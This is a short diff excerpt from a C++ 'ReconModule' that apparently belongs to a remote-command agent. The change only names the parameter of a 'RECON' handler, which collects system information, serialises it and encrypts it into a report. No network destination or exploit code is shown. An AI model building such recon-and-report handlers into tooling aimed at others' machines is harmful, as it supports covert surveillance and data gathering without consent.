@@ -74,7 +74,7 @@ std::string ReconModule::encrypt_report(const std::string& js) {
 }
 
 void ReconModule::init() {
-    register_command("RECON", [this](const nlohmann::json&){
+    register_command("RECON", [this](const nlohmann::json& cmd){
         auto info = collect();
         std::string payload = info.dump();
         std::string enc = encrypt_report(payload);
